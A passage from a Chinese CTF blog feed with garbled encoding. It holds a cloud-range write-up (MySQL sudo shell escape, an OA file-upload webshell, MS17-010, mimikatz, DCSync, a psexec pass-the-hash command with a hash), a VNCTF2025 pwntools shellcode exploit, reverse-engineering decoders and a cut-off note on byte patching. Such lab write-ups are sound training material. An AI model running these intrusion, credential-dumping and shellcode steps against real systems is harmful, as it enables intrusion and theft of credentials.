src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741514046470-62521c94-ec45-4483-95e1-5211072a06b2.png" class="" title="img"></p><p>è¿™é‡Œè¦æ‰§è¡Œ&#x2F;bin&#x2F;shéœ€è¦åå¼¹shellï¼Œä½†è¿˜å¯ä»¥ç”¨å…¶ä»–å‘½ä»¤</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> mysql -e <span class="hljs-string">&#x27;\! find / -name flag*&#x27;</span><br></code></pre></td></tr></table></figure><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508248495-ca2296f4-d207-4d0b-8d16-7fce0876b3d6.png" class="" title="img"><h1 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h1><p>æŠŠfscanæ‹–è¿›èšå‰‘ï¼Œå†æ¬¡æ‰«æå†…ç½‘<code>./fscan -h 172.22.1.0/24</code></p><p>å‘ç°å…¶ä»–å‡ å°å†…ç½‘æœºå™¨æœºå™¨å¼€æ”¾çš„ç«¯å£</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509246118-492e0383-fc07-43ef-8907-0e13bcf8f9c0.png" class="" title="img"><p>æ•´ç†å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">172.22.1.18 XIAORANG-OA01<br>ç«¯å£: 135,80,3306,445,139<br><br>172.22.1.21 XIAORANG-WIN7<br>ç«¯å£: 445,135,139<br>MS17-010æ°¸æ’ä¹‹è“<br><br>172.22.1.2 DC01åŸŸæ§<br>ç«¯å£: 135,139,445,88<br></code></pre></td></tr></table></figure><p>172.22.1.18 ä¿¡å‘¼OA</p><p>bpçˆ†ç ´æµ‹è¯•å‡ºå¼±å£ä»¤admin&#x2F;admin123</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515958369-1f71a417-af81-4bd4-b8f0-37196104ffa4.png" class="" title="img"><p>æˆ‘ç”¨ProxySwitchæ’ä»¶ä¸€ç›´ä¸è¡Œï¼Œåé¢ç”¨çš„firefoxè‡ªå¸¦çš„ä»£ç†</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536551703-300e98f3-0ff2-4a91-8bf4-5847f7f606ac.png" class="" title="img"><p>æˆåŠŸç™»å½•</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536513259-26f61ef4-dcd9-47e9-8c9d-ce6147167217.png" class="" title="img"><p>getshell å‚è€ƒ <a href="https://www.freebuf.com/articles/web/286380.html">https://www.freebuf.com/articles/web/286380.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;form action=<span class="hljs-string">&quot;http://172.22.1.18/api.php?m=upload&amp;a=upfile&amp;adminid=&amp;device=1625923765752&amp;cfrom=mweb&amp;token=&amp;sysmodenum=officia&amp;sysmid=0&amp;maxsize=2&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536869961-c611d830-bccf-44f3-833e-a67ff3cbc642.png" class="" title="img"><p>æ‹¿åˆ° id, ç„¶åè®¿é—® <code>http://172.22.1.18/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=9</code> ç”Ÿæˆ php</p><p>èšå‰‘è®¾ç½®ä»£ç†</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741515272362-7c835135-4622-4088-bae9-5486657386b2.png" class="" title="img"><p>æˆ‘è¿™é‡Œç›´æ¥è¿æ¥é˜Ÿå‹ä¸Šä¼ çš„é©¬</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741536739183-b1fbf11f-42ff-4952-966f-89b501d3fd44.png" class="" title="img"><p>å› ä¸ºæ˜¯ phpstudy æ­å»ºçš„ç½‘ç«™, ç›´æ¥å°±æ˜¯systemæƒé™</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516105119-b0069a99-1c70-4faa-9112-e2913295f19e.png" class="" title="img"><p>dir &#x2F;s &#x2F;b | find â€œflagâ€ &gt; â€œC:\tmp.txtâ€å¯¼å‡ºåˆ°txté˜²æ­¢ä¸€æ®µæ—¶é—´è‡ªåŠ¨æ–­å¼€è¿æ¥</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509122660-fcbe8912-697e-4c70-be7f-28e9a9edaa40.png" class="" title="img"><p>æ‰¾åˆ°flagæ‰€åœ¨ç›®å½•</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741509138885-95a0a17e-97ce-40c0-98f1-dba0cd769c53.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741508441566-9a5ccc79-82d7-47b9-8832-3230a524b1bd.png" class="" title="img"><h1 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h1><p>ç”¨ä»£ç†å¯åŠ¨msfconsole</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741511777054-eddc92ad-0e96-4066-97a8-58b778add673.png" class="" title="img"><p>use ms17-010</p><p>æ‰¾åˆ°æ­£å‘ä»£ç†ç›¸å…³çš„payload</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537014019-7ee74aae-6ace-4ced-ab31-2671362404a8.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537215209-7bcff258-a82c-498c-85ea-a546331d79d9.png" class="" title="img"><p>é˜Ÿå‹ä¹‹å‰ç”¨è¿‡4444æ¥ç›‘å¬ï¼Œè¿™é‡Œæ¢æˆ4445</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537276384-ba09e790-1d1a-4dea-9b57-0c158a391aba.png" class="" title="img"><p>è¿™é‡Œæˆ‘runäº†äº”å…­æ¬¡æ‰æˆåŠŸï¼ŒæœŸé—´ä¸€ç›´é‡åˆ°fail</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741510029608-0df51d78-82de-4b2d-a9c9-0486e0ba037c.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537381682-a45ca320-ceb0-4b52-a2f0-c1a45d2afa40.png" class="" title="img"><p>å¯¼å‡ºhashï¼Œguestå¯¹åº”çš„æ˜¯Empty String</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537477780-e0cd4e66-fa9d-43c2-a1dc-3510408ef8de.png" class="" title="img"><p>å¯¼å…¥mimikatzåæ”¶é›†å‡­æ®</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537619463-4eb32de1-d6f1-48a1-b373-ca0db1e1097d.png" class="" title="img"><p>è¿™å°æœºå™¨æœ‰ DCSync çš„æƒé™, æ‰€ä»¥èƒ½ç›´æ¥ä»åŸŸæ§ä¸Šå¯¼å‡º Hash</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537689801-19b37d4c-aa41-458b-98d2-080b4a0e7cc4.png" class="" title="img"><p>å®‰è£…impacket</p><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537765310-39aa47b0-f116-490c-8589-ba77b2cc6b30.png" class="" title="img"><p>psexecå‡­æ®ä¼ é€’æ”»å‡»</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> psexec.py -dc-ip <span class="hljs-number">172.22.1.2</span> -hashes :<span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8 XIAORANG.LAB/administrator@<span class="hljs-number">172.22.1.18</span><br></code></pre></td></tr></table></figure><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741537914591-e8a86703-071e-4cda-b7ee-5528c3a98d7c.png" class="" title="img"><img src="/2025/03/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial-wp/1741516372835-d6013e8b-7a54-4b99-b3f9-2fff10c897e8.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025éƒ¨åˆ†Pwnä¸Reverse</title>
    <link href="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/"/>
    <url>/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1738999531360-a39871a2-1265-486b-8ccc-64b461ed0c0a.png" class="" title="img"><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005361582-9da085b2-e416-46a1-9fb2-9e0bd25a897e.png" class="" title="img"><p>è¿™é¢˜ä¼šæŠŠrspç½®0ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨ç³»ç»Ÿç”Ÿæˆçš„shellcodeæ²¡ç”¨</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005350423-7d24494a-123d-4de6-949b-6ef729da0d79.png" class="" title="img"><p>è€ƒè™‘ç”¨ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node.vnteam.cn&#x27;</span>,<span class="hljs-number">45311</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov al,59</span><br><span class="hljs-string">add rdi,8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-comment">#debug()</span><br>s(shellcode)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="hook-fish"><a href="#hook-fish" class="headerlink" title="hook_fish"></a>hook_fish</h2><p>åŠ è½½èµ„æº</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016398519-e32dac73-5afc-4209-b36d-d3d8f453bc8d.png" class="" title="img"><p>å¾—åˆ°hook_fish.dex</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739014258915-192f023d-b5c1-450a-a7de-39fc5c30387a.png" class="" title="img"><p>ä»è¾“å…¥ç»è¿‡encryptå‡½æ•°ï¼Œåé¢è°ƒç”¨loadclassæ–¹æ³•</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016537563-fc776926-5d08-4ff1-9a7a-7a6f28f35258.png" class="" title="img"><p>encodeæ–¹æ³•åŠ è½½hook_fishçš„encodeæ–¹æ³•ï¼Œç„¶ååŠ è½½hook_fishçš„checkæ–¹æ³•æ¯”è¾ƒ</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016667231-d800b539-4a0e-4361-a835-ca759dc44344.png" class="" title="img"><p>checkæ–¹æ³•é‡Œé¢æ‰¾åˆ°å¯†æ–‡ï¼Œå‘ç°hook_fishçš„encodeæ–¹æ³•ç”¨HashMapåœ¨åšæ˜ å°„</p><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016785826-9f878d15-ab10-4ae7-a551-1f403c36302f.png" class="" title="img"><p>å…ˆæ ¹æ®å¯†æ–‡æ‰¾åˆ°æ˜ å°„å‰çš„å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HookFish</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;&#125;<br>        self.fish_ecode = &#123;&#125;<br>        self.strr = <span class="hljs-string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span><br>        self.decode_map()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_map</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;<br>            <span class="hljs-string">&quot;iiijj&quot;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&quot;jjjii&quot;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;jijij&quot;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&quot;jjijj&quot;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&quot;jjjjj&quot;</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&quot;ijjjj&quot;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <br>            <span class="hljs-string">&quot;jjjji&quot;</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&quot;iijii&quot;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&quot;ijiji&quot;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&quot;iiiji&quot;</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&quot;jjjij&quot;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&quot;jijji&quot;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <br>            <span class="hljs-string">&quot;ijiij&quot;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&quot;iijji&quot;</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&quot;ijjij&quot;</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&quot;jiiji&quot;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&quot;ijijj&quot;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&quot;jijii&quot;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <br>            <span class="hljs-string">&quot;iiiii&quot;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&quot;jjiij&quot;</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&quot;ijjji&quot;</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&quot;jiiij&quot;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&quot;iiiij&quot;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&quot;iijij&quot;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <br>            <span class="hljs-string">&quot;jjiji&quot;</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&quot;jijjj&quot;</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&quot;iijjl&quot;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&quot;iiilj&quot;</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&quot;iliii&quot;</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;jiili&quot;</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <br>            <span class="hljs-string">&quot;jilji&quot;</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;iliji&quot;</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;jjjlj&quot;</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;ijljj&quot;</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;iljji&quot;</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&quot;jjjli&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span></span>):<br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), <span class="hljs-number">5</span>): <br>            fragment = <span class="hljs-built_in">str</span>[i:i+<span class="hljs-number">5</span>]<br>            result.append(self.fish_dcode.get(fragment, <span class="hljs-string">&#x27;?&#x27;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    hook_fish = HookFish()<br>    decoded_str = hook_fish.decode(hook_fish.strr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoded string: &quot;</span>, decoded_str)<br><span class="hljs-comment">#0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</span><br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰ç…§encrypté€†å‘å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&#x27;</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(len(s)):</span><br><span class="hljs-comment">#     for j in range(48,127):</span><br><span class="hljs-comment">#         k=j</span><br><span class="hljs-comment">#         if k&gt;=97 and k&lt;=97+25:</span><br><span class="hljs-comment">#             tmp=k-49+(i%4)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             tmp=k+ord(&#x27;7&#x27;)+(i%10)</span><br><span class="hljs-comment">#         if tmp==ord(s[i]):</span><br><span class="hljs-comment">#             print(chr(j),end=&quot;&quot;)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#a9297889a8fb9b3a6b9a870b57db3afa2b47bb3ac84739fa3a1bdb3aaa5779ca56570b1c</span><br>s2=<span class="hljs-string">&#x27;a9297889a8fb9b3a6b9a870b57db3afa2b47bb3ac84739fa3a1bdb3aaa5779ca56570b1c&#x27;</span><br>s3=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># print(&#x27;\n&#x27;)</span><br><span class="hljs-comment"># for i in range(0,len(s2),2):</span><br><span class="hljs-comment">#     s3+=s2[i+1]+s2[i]</span><br><span class="hljs-comment"># print(s3)</span><br><br><span class="hljs-comment">#9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1</span><br>s3=<span class="hljs-string">&#x27;9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s3),<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s3[i]+s3[i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">68</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>syscall</tag>
      
      <tag>appé€†å‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patch</title>
    <link href="/2025/02/05/patch/"/>
    <url>/2025/02/05/patch/</url>
    
    <content type="html"><![CDATA[<p>used for a reverse problem named sm4 in MoeCTF2024</p><p>å½“é¢˜ç›®ç»™äº†è§£å¯†å‡½æ•°æˆ–è€…åŠ è§£å¯†å¯¹ç§°çš„å‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå¯ä»¥ä¸å»é€†ç®—æ³•</p><img src="/2025/02/05/patch/1724231748225-bb19b32d-2991-4049-8f97-acc29d85d459.png" class="" title="img"><ul><li><code>**4C**</code>: è¿™æ˜¯ <code>REX</code> å‰ç¼€ï¼Œç”¨äºæ‰©å±•å¯„å­˜å™¨å’Œæ“ä½œæ•°çš„å¤§å°ã€‚<code>4C</code> æŒ‡å®šäº†æŒ‡ä»¤ä½¿ç”¨æ‰©å±•çš„ 64 ä½å¯„å­˜å™¨ï¼ˆåœ¨æ­¤æŒ‡ä»¤ä¸­ä¸º <code>r8</code>ï¼‰ï¼Œå¹¶ä¸”æ¶‰åŠåˆ° <code>r8</code> è¿™ä¸€é«˜ä½å¯„å­˜å™¨</li><li><code>**8D**</code>: è¿™æ˜¯ <code>LEA</code>æŒ‡ä»¤çš„æ“ä½œç </li><li><code>**45 10**</code>: è¿™æ˜¯æ“ä½œæ•°çš„ ModR&#x2F;M å­—èŠ‚å’Œä½ç§»é‡ã€‚<code>45</code> è¡¨ç¤ºç›®æ ‡å¯„å­˜å™¨æ˜¯ <code>r8</code>ï¼ˆ4Dçš„æ—¶å€™è¡¨ç¤ºrcx)ï¼Œæºæ“ä½œæ•°çš„åŸºå€å¯„å­˜å™¨æ˜¯ <code>rbp</code>ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª 8 ä½ç¬¦å·æ‰©å±•çš„ä½ç§»é‡ã€‚<code>10</code> æ˜¯ä½ç§»é‡</li></ul><img src="/2025/02/05/patch/1724231033107-e06ceffd-7d82-49af-9660-e9ea668816c9.png" class="" title="img"><p>æ ˆç»“æ„å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">-0000000000000120 ; Frame size: 120; Saved regs: 8; Purge: 0<br><br>-0000000000000100 enc             db 48 dup(?)          ; enc: 48å­—èŠ‚<br>-00000000000000D0 Data_plain      db 48 dup(?)          ; Data_plain: 48å­—èŠ‚<br>-00000000000000A0 key             db 16 dup(?)          ; key: 16å­—èŠ‚<br>-0000000000000090 decode_Result   db 50 dup(?)          ; decode_Result: 50å­—èŠ‚<br>-0000000000000050 encode_Result   db 